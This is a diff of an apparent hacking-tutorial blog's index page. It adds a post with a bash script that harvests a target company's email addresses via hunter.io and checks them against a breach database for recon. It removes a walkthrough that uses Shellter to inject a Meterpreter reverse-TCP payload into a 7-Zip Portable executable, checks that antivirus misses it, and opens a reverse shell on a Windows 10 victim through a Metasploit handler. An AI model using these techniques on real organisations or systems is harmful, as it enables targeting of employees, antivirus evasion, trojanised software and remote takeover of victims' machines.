@@ -14,6 +14,60 @@
 <div id="description">Hacking tutorials + info</div>
 </div></div></div>
 <div id="divbody"><div class="content">
+<h3><a class="ablack" href="company-email-enumeration--breached-email-finder.html">
+Company Email Enumeration + Breached Email Finder
+</a></h3>
+<!-- bashblog_timestamp: #201610242334.08# -->
+<div class="subtitle">October 24, 2016 &mdash; 
+metalkey
+</div>
+<!-- text begin -->
+
+Enumerating email addresses for a target domain and checking if these emails appear in known breaches can be extremely useful when performing recon.<br>
+This script will use <b><a href="https://hunter.io">hunter.io</a></b> to enumerate domain emails and feed them into <b><a href="https://hacked-emails.com">hacked-emails.com</a></b> to check if they appear in known breaches.<br>
+<br>
+<b>Note:</b> Substitute <b>YOURAPIKEY</b> with your hunter.io API key. This can be obtained by creating a hunter.io account.<br>
+<br>
+<code>
+	<div class="code">
+root@kali:~#	<com>cat emails.sh</com><br>
+		#!/bin/bash<br>
+		rm found-emails.txt<br>
+		rm hacked-emails.txt<br>
+		clear<br>
+		echo -e "\e[92mEnter Target Domain:"<br>
+		echo -e "\e[39m"<br>
+		read hname<br>
+		clear<br>
+		echo -e "[+] Email Recon Started"<br>
+		echo -e "\e[39m"<br>
+		<br>
+		# Email Checks<br>
+		echo "- Enumerating Domain Emails"<br>
+		curl -k -s "https://api.emailhunter.co/v1/search?domain=$hname&api_key=<b>YOURAPIKEY</b>" | grep -Po '"value" :.*?[^\\]",' | cut -d'"' -f4 > found-emails.txt<br>
+		echo "Found the following emails:"<br>
+		cat found-emails.txt<br>
+		echo ""<br>
+		echo "[+] Checking if Emails have been breached"<br>
+		for email in $(cat found-emails.txt);do<br>
+		curl -k -s "https://hacked-emails.com/api?q=$email" | grep '"status":"found"' | cut -d'"' -f8 >> hacked-emails.txt &<br>
+		done<br>
+		wait<br>
+		echo "The following email addresses appear in known breaches:"<br>
+		cat hacked-emails.txt<br>
+		<br>
+		echo -e "\e[39m"<br>
+		echo -e "[*] Please wait..."<br>
+		wait<br>
+		echo -e "[END] Email Recon Complete!"<br>
+		echo -e ""<br>
+
+	</div>
+</code>
+
+<p>Tags: <a href='tag_recon.html'>recon</a></p>
+
+<!-- text end -->
 <h3><a class="ablack" href="installing-wickr-on-ubuntu-1604.html">
 Installing Wickr on Ubuntu 16.04
 </a></h3>
@@ -48,7 +102,7 @@ metalkey
 </div>
 </code>
 
-<p>Tags: <a href='tag_Privacy.html'>Privacy</a></p>
+<p>Tags: <a href='tag_Privacy.html'>privacy</a></p>
 
 <!-- text end -->
 <h3><a class="ablack" href="port-scanning-with-netcat-up-to-1000pps.html">
@@ -262,6 +316,7 @@ root@metasploitable:/etc/unreal#
 
 
 
+
 <!-- text end -->
 <h3><a class="ablack" href="vsftpd-v234-backdoor-command-execution.html">
 VSFTPD v2.3.4 Backdoor Command Execution
@@ -420,6 +475,7 @@ root
 
 
 
+
 <!-- text end -->
 <h3><a class="ablack" href="shellshock-explained--exploitation-tutorial.html">
 Shellshock Explained + Exploitation Tutorial
@@ -548,131 +604,6 @@ If your system is vulnerable, ensure it is patched immediately by upgrading your
 
 <p>Tags: <a href='tag_shellshock.html'>shellshock</a></p>
 
-
-
-
-
-
-
-
-
-
-
-<!-- text end -->
-<h3><a class="ablack" href="shellter---the-ultimate-tool-for-av-evasion.html">
-Shellter – The ultimate tool for AV evasion
-</a></h3>
-<!-- bashblog_timestamp: #201607011527.49# -->
-<div class="subtitle">July 01, 2016 &mdash; 
-metalkey
-</div>
-<!-- text begin -->
-
-<p>Shellter Website - <a href="https://www.shellterproject.com/">https://www.shellterproject.com/</a><br>
-<br>
-<strong>Attacker:</strong> Kali Linux<br>
-<strong>Victim:</strong> Windows 10 (fully patched, fully updated antivirus)</p>
-
-<h2>Introduction</h2>
-
-<p>Shellter is a tool for injecting dynamic shellcode into win32 exe’s. The shellcode can be yours, or something you generate via a 3rd party framework such as Metasploit.<br>
-Shellter preserves the original structure of the target executable and can be used in either Automatic or Manual mode. It can also be used to create encoded/self-decrypting payloads.<br>
-<br>
-In this tutorial, we will cover the automatic mode of operation.<br></p>
-
-<h2>Installation</h2>
-
-<p>You can either download and install Shellter from the Shellter Website or install using apt-get in Kali:
-<code></p>
-
-<div class="code">
-root@kali:~$ <com>apt-get update && apt-get install shellter</com>
-</div>
-
-<p></code></p>
-
-<h2>Payload Creation</h2>
-
-<p>Start shellter and select [A] for automatic mode, then select your target .exe file.
-<code></p>
-
-<div class="code">
-root@kali:~$ <com>shellter</com><br>
-Choose Operation Mode - Auto/Manual (A/M/H): <com>A</com><br>
-PE Target: <com>/root/Downloads/7-ZipPortable.exe</com>
-</div>
-
-<p></code>
-On the payload menu, select [L] then [1] for Meterpreter<em>Reverse</em>TCP.<br>
-Enter your IP address and port you wish to use the payload on.<br>
-Note: If you select Stealth Mode, you must set [exitfunc] to [thread] in Metasploit.
-<code></p>
-
-<div class="code">
-************<br>
-* Payloads *<br>
-************<br>
-<br>
-[1] Meterpreter_Reverse_TCP<br>
-[2] Meterpreter_Reverse_HTTP<br>
-[3] Meterpreter_Reverse_HTTPS<br>
-[4] Meterpreter_Bind_TCP<br>
-[5] Shell_Reverse_TCP<br>
-[6] Shell_Bind_TCP<br>
-[7] WinExec<br>
-<br>
-Use a listed payload or custom? (L/C/H): <com>L</com><br>
-Select payload by index: <com>1</com><br>
-SET LHOST: <com>192.168.1.162</com><br>
-SET LPORT: <com>4321</com>
-</div>
-
-<p></code>
-Shellter will now encode and obfuscate the payload.<br>
-When the process is complete, hit [Enter] to exit.<br>
-<br>
-At this point you can either use the checkvt script from Veil Evasion (<a href="https://www.veil-framework.com/how-to-safely-check-veil-payloads-against-virustotal/">https://www.veil-framework.com/how-to-safely-check-veil-payloads-against-virustotal/</a>) or Mubix’s vt-notify script (<a href="https://github.com/mubix/vt-notify">https://github.com/mubix/vt-notify</a>) to safely check the payload against Virus Total. Alternatively, use the virus scanner of your target system to confirm the payload is undetectable. DO NOT upload your exe to Virus Total.</p>
-
-<h2>Exploitation</h2>
-
-<p><code></p>
-
-<div class="code">
-root@kali:~$ <com>msfconsole</com><br>
-msf > <com>use exploit/multi/handler</com><br>
-msf exploit(handler) > <com>set payload windows/meterpreter/reverse_tcp</com><br>
-msf exploit(handler) > <com>set lhost 192.168.1.162</com><br>
-msf exploit(handler) > <com>set lport 4321</com><br>
-msf exploit(handler) > <com>exploit</com>
-</div>
-
-<p></code>
-Run the payload on your Victim machine
-<code></p>
-
-<div class="code">
-C:\7-ZipPortable><com>7-ZipPortable.exe</com>
-</div>
-
-<p></code>
-Back in Kali, a Meterpreter session will open and you now have a reverse shell to your victim Windows 10 machine.
-<code></p>
-
-<div class="code">
-[*] Meterpreter session 1 opened (192.168.1.162:4321 -> 192.168.1.11:49627) at 2015-10-05 00:39:33 +1100<br>
-<br>
-meterpreter > <com>shell</com><br>
-Process 3788 created.<br>
-Channel 1 created.<br>
-Microsoft Windows [Version 10.0.10240]<br>
-(c) 2015 Microsoft Corporation. All rights reserved.<br>
-<br>
-C:\7-ZipPortable> 
-</div>
-
-<p></code></p>
-
-<p>Tags: <a href='tag_av-evasion.html'>av-evasion</a></p>
 
 
 
